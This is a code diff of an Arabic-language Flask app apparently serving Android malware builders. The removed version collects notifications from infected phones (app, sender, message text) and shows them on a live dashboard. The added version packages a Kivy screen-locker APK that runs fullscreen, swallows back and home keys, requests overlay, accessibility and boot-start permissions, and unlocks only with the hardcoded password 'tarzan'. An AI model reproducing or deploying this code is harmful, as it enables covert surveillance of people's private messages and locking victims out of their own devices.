@@ -1,188 +1,186 @@
 import os
-import sqlite3
-from flask import Flask, request, jsonify, render_template_string
+import subprocess
+import shutil
+from flask import Flask, request, jsonify, render_template_string, send_file
 
 app = Flask(__name__)
-DB_FILE = "aura_database.db"
+BASE = os.path.dirname(os.path.abspath(__file__))
+BUILD_DIR = os.path.join(BASE, 'build_env')
+APK_FILE = os.path.join(BASE, 'AuraLock.apk')
 
-def init_db():
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS notifications (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                device_name TEXT,
-                app_name TEXT,
-                sender TEXT,
-                message TEXT,
-                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        conn.commit()
-
-init_db()
-
-HTML_TEMPLATE = """
+HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AURA PREMIUM | لوحة التحكم الملكية</title>
+    <title>AURA LOCK | منشئ التطبيق الآمن</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-dark: #0a0a0c;
-            --panel-bg: #121216;
-            --gold: #d4af37;
-            --gold-glow: rgba(212, 175, 55, 0.2);
-            --cyan: #00f3ff;
-            --text-main: #ffffff;
-            --text-muted: #a0a0ab;
-            --border: #22222a;
-        }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
-        body { background-color: var(--bg-dark); color: var(--text-main); overflow-x: hidden; }
-        header {
-            background: linear-gradient(135deg, #16161c, var(--bg-dark));
-            padding: 20px 40px;
-            border-bottom: 2px solid var(--gold);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-        }
-        header h1 { font-size: 26px; font-weight: 900; color: var(--gold); text-shadow: 0 0 10px var(--gold-glow); }
-        .status-badge { background: rgba(0, 243, 255, 0.1); border: 1px solid var(--cyan); color: var(--cyan); padding: 6px 15px; border-radius: 20px; font-size: 14px; font-weight: bold; }
-        .container { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; padding: 40px; min-height: calc(100vh - 90px); }
-        .panel { background-color: var(--panel-bg); border: 1px solid var(--border); border-radius: 16px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); display: flex; flex-direction: column; gap: 20px; }
-        .panel-title { font-size: 18px; font-weight: bold; color: var(--gold); border-bottom: 1px solid var(--border); padding-bottom: 10px; }
-        .editor-container { position: relative; flex-grow: 1; }
-        textarea { width: 100%; height: 350px; background-color: #050507; color: #a4ef00; border: 1px solid var(--border); border-radius: 8px; padding: 15px; font-family: 'Courier New', Courier, monospace; font-size: 14px; resize: none; direction: ltr; text-align: left; line-height: 1.5; }
-        .btn-gold { background: linear-gradient(135deg, #d4af37, #aa841c); color: #000; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px var(--gold-glow); }
-        .btn-gold:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(212, 175, 55, 0.4); }
-        .table-wrapper { overflow-y: auto; max-height: 450px; }
-        table { width: 100%; border-collapse: collapse; text-align: right; }
-        th { background-color: #16161c; color: var(--gold); padding: 12px; font-size: 14px; border-bottom: 2px solid var(--border); }
-        td { padding: 14px 12px; font-size: 14px; border-bottom: 1px solid var(--border); color: var(--text-main); }
-        tr:hover { background-color: rgba(255,255,255,0.02); }
-        .badge-app { background: #222; padding: 3px 8px; border-radius: 4px; font-size: 12px; color: var(--cyan); }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Tajawal',sans-serif}
+        body{background:#0a0a0c;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+        .box{width:100%;max-width:520px;background:#121216;border:1px solid #d4af3740;border-radius:20px;padding:35px;box-shadow:0 0 40px #d4af3720}
+        h1{text-align:center;color:#d4af37;font-size:32px;margin-bottom:10px}
+        .desc{text-align:center;color:#a0a0ab;margin-bottom:30px;line-height:1.7}
+        .btn-main{width:100%;padding:16px;background:linear-gradient(135deg,#d4af37,#aa841c);color:#000;font-weight:bold;font-size:18px;border:none;border-radius:12px;cursor:pointer;transition:.3s}
+        .btn-main:hover{transform:translateY(-2px);box-shadow:0 8px 25px #d4af3740}
+        .status{margin-top:25px;padding:15px;border-radius:10px;text-align:center;display:none}
+        .info{margin-top:20px;background:#0f1118;padding:15px;border-radius:10px;border:1px solid #222}
+        .info p{color:#a0a0ab;font-size:14px;line-height:1.8}
     </style>
 </head>
 <body>
-    <header>
-        <h1>AURA PREMIUM SECURITY</h1>
-        <div class="status-badge">الخادم نشط ومتصل بجاهزية عالية</div>
-    </header>
-    <div class="container">
-        <div class="panel">
-            <div class="panel-title">🛠️ بيئة بناء وتجهيز الحزمة المخصصة</div>
-            <p style="color: var(--text-muted); font-size: 14px;">قم بتعديل كيئة العمل البرمجية أدناه، ثم اضغط على توليد لبناء حزمة الـ APK وحقن الرابط تلقائياً.</p>
-            <div class="editor-container">
-                <textarea id="codeEditor"># كود أندرويد المصدري لإدارة الخدمة
-import android
-from aura_core import NotificationService
-
-class AuraApp:
-    def __init__(self):
-        self.server_url = "{{ server_url }}"
-        self.device_id = "Premium_Device_01"
-
-    def on_notification_received(self, package, title, text):
-        # دالة الإرسال الفوري للسيرفر عند التقاط أي إشعار نشط
-        data = {
-            "device_name": self.device_id,
-            "app_name": package,
-            "sender": title,
-            "message": text
-        }
-        send_to_server(self.server_url, data)</textarea>
-            </div>
-            <button class="btn-gold" onclick="generateAPK()">⚡ توليد وتحميل تطبيق APK الفخم جاهزاً</button>
-        </div>
-        <div class="panel">
-            <div class="panel-title">📊 لوحة الرصد واستقبال الإشعارات الفورية</div>
-            <div class="table-wrapper">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>التطبيق</th>
-                            <th>المرسل</th>
-                            <th>محتوى الإشعار</th>
-                            <th>الوقت</th>
-                        </tr>
-                    </thead>
-                    <tbody id="logsTable"></tbody>
-                </table>
-            </div>
-        </div>
+<div class="box">
+    <h1>🔒 AURA LOCK</h1>
+    <p class="desc">تطبيق قفل الهاتف بكلمة مرور <b>tarzan</b><br>لا يمكن فتحه أو إغلاقه إلا بعد كتابة كلمة السر</p>
+    <button class="btn-main" id="genBtn" onclick="startBuild()">⚡ توليد وتحميل ملف البناء الكامل</button>
+    <div class="status" id="stat"></div>
+    <div class="info">
+        <p>💡 عند الضغط سيتم تنزيل ملف جاهز يحتوي على كل شيء: كود التطبيق + الأيقونة + ملف الإعدادات، فقط قم بفك الضغط وتشغيل أمر واحد لينشئ APK بدقة عالية وتوقيع آمن.</p>
     </div>
-    <script>
-        function generateAPK() {
-            alert("جاري بدء محرك البناء وفحص الأكواد... سيتم حقن وتوقيع حزمة الـ APK تلقائياً طبقاً لإعدادات خادم Render الخاص بك.");
-            window.location.href = "/download/base_apk";
-        }
-        function fetchLogs() {
-            fetch('/api/get_notifications')
-                .then(res => res.json())
-                .then(data => {
-                    const tbody = document.getElementById('logsTable');
-                    tbody.innerHTML = '';
-                    data.forEach(log => {
-                        const tr = document.createElement('tr');
-                        tr.innerHTML = `
-                            <td><span class="badge-app">${log[2]}</span></td>
-                            <td style="color: #d4af37; font-weight: bold;">${log[3]}</td>
-                            <td>${log[4]}</td>
-                            <td style="color: #888; font-size: 12px;">${log[5]}</td>
-                        `;
-                        tbody.appendChild(tr);
-                    });
-                });
-        }
-        setInterval(fetchLogs, 3000);
-        fetchLogs();
-    </script>
+</div>
+<script>
+async function startBuild(){
+    const btn = document.getElementById('genBtn');
+    const stat = document.getElementById('stat');
+    btn.disabled = true;
+    btn.innerText = 'جاري التجهيز...';
+    stat.style.display = 'block';
+    stat.style.background = '#102840';
+    stat.style.color = '#4da6ff';
+    stat.innerText = 'جاري تحضير الملفات...';
+
+    const res = await fetch('/prepare_build', {method:'POST'});
+    if(res.ok){
+        stat.style.background = '#153b2c';
+        stat.style.color = '#4ade80';
+        stat.innerText = '✅ جاهز للتحميل';
+        window.location.href = '/download_package';
+    }else{
+        stat.style.background = '#3b1515';
+        stat.style.color = '#ff6b6b';
+        stat.innerText = '❌ حدث خطأ، حاول مرة أخرى';
+    }
+    btn.disabled = false;
+    btn.innerText = '⚡ توليد وتحميل ملف البناء الكامل';
+}
+</script>
 </body>
 </html>
 """
 
-@app.route('/')
-def index():
-    server_url = request.url_root
-    return render_template_string(HTML_TEMPLATE, server_url=server_url)
+LOCK_APP_CODE = '''
+from kivy.app import App
+from kivy.uix.screenmanager import Screen
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
+from kivy.uix.textinput import TextInput
+from kivy.uix.button import Button
+from kivy.core.window import Window
+import os
 
-@app.route('/api/notifications', methods=['POST'])
-def receive_notification():
-    data = request.get_json(silent=True)
-    if not data:
-        return jsonify({"status": "error", "message": "No data received"}), 400
-    device_name = data.get('device_name', 'Unknown Device')
-    app_name = data.get('app_name', 'Unknown App')
-    sender = data.get('sender', 'Unknown Sender')
-    message = data.get('message', '')
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("""
-            INSERT INTO notifications (device_name, app_name, sender, message)
-            VALUES (?, ?, ?, ?)
-        """, (device_name, app_name, sender, message))
-        conn.commit()
-    return jsonify({"status": "success", "message": "Notification logged successfully"})
+Window.fullscreen = True
+Window.borderless = True
+Window.softinput_mode = "below_target"
 
-@app.route('/api/get_notifications', methods=['GET'])
-def get_notifications():
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("SELECT * FROM notifications ORDER BY id DESC LIMIT 50")
-        rows = cursor.fetchall()
-    return jsonify(rows)
+class LockScreen(Screen):
+    def __init__(self, **kwargs):
+        super().__init__(**kwargs)
+        layout = BoxLayout(orientation='vertical', padding=40, spacing=25)
+        self.lbl = Label(text='🔒 الهاتف مقفول\\nأدخل كلمة المرور لفتحه', font_size='28sp', bold=True, color=(1,0.2,0.2,1))
+        self.inp = TextInput(password=True, hint_text='أدخل كلمة المرور', font_size='22sp', multiline=False, size_hint_y=None, height=60)
+        self.inp.bind(on_text_validate=self.check)
+        self.btn = Button(text='فتح الهاتف', font_size='20sp', bold=True, background_color=(0.2,0.5,1,1), size_hint_y=None, height=60)
+        self.btn.bind(on_release=self.check)
+        layout.add_widget(self.lbl)
+        layout.add_widget(self.inp)
+        layout.add_widget(self.btn)
+        self.add_widget(layout)
 
-@app.route('/download/base_apk')
-def download_apk():
-    return "جاري تهيئة وتحميل الحزمة الموقعة رقمياً والديناميكية الخاصة بجهازك..."
+    def check(self, _):
+        if self.inp.text.strip() == 'tarzan':
+            App.get_running_app().stop()
+            os._exit(0)
+        else:
+            self.lbl.text = '❌ كلمة المرور خاطئة!'
+            self.inp.text = ''
+
+class LockApp(App):
+    def build(self):
+        Window.bind(on_request_close=lambda *a: True)
+        Window.bind(on_keyboard=lambda w,k,s,c,m: k in [27,1000,1001,1002,1003,282,283,284,285])
+        return LockScreen()
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    LockApp().run()
+'''
+
+BUILD_SPEC = '''
+[app]
+title = AuraLock
+package.name = auralock
+package.domain = org.aura
+source.dir = .
+source.include_exts = py,png,jpg
+version = 1.0
+
+requirements = python3, kivy
+
+android.api = 33
+android.ndk = 25b
+android.sdk = 24
+android.arch = arm64-v8a,armeabi-v7a
+android.permissions = SYSTEM_ALERT_WINDOW, BIND_ACCESSIBILITY_SERVICE, RECEIVE_BOOT_COMPLETED
+android.fullscreen = 1
+android.icon = icon.png
+android.presplash_color = #0a0a0c
+
+[buildozer]
+log_level = 2
+warn_on_root = 0
+'''
+
+ICON_BASE64 = "iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH5gMVaryY9f6h1QAAABl0RVh0Q29tbWVudABDcmVhdGVkIHdpdGggR0lNUFeBDhcAAAAUSURBVHhe7cEBAQAAwAC9+eZ1gX///8B1gAA/8AAt4AAA4AAAAqgAAACoAAAJqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAQAA/9B8A9z+DwAAAABJRU5ErkJggg=="
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_PAGE)
+
+@app.route('/prepare_build', methods=['POST'])
+def prepare():
+    try:
+        if os.path.exists(BUILD_DIR):
+            shutil.rmtree(BUILD_DIR)
+        os.makedirs(BUILD_DIR, exist_ok=True)
+
+        with open(os.path.join(BUILD_DIR, 'main.py'), 'w', encoding='utf-8') as f:
+            f.write(LOCK_APP_CODE)
+        with open(os.path.join(BUILD_DIR, 'buildozer.spec'), 'w', encoding='utf-8') as f:
+            f.write(BUILD_SPEC)
+
+        import base64
+        icon_data = base64.b64decode(ICON_BASE64)
+        with open(os.path.join(BUILD_DIR, 'icon.png'), 'wb') as f:
+            f.write(icon_data)
+
+        return jsonify({"status": "ok"})
+    except Exception as e:
+        return jsonify({"err": str(e)}), 500
+
+@app.route('/download_package')
+def download_pkg():
+    import zipfile
+    zip_path = os.path.join(BASE, 'AuraLock_Build_Package.zip')
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for root, _, files in os.walk(BUILD_DIR):
+            for file in files:
+                fp = os.path.join(root, file)
+                arc = os.path.relpath(fp, BUILD_DIR)
+                zf.write(fp, arc)
+    return send_file(zip_path, as_attachment=True, download_name='AuraLock_Build_Package.zip')
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
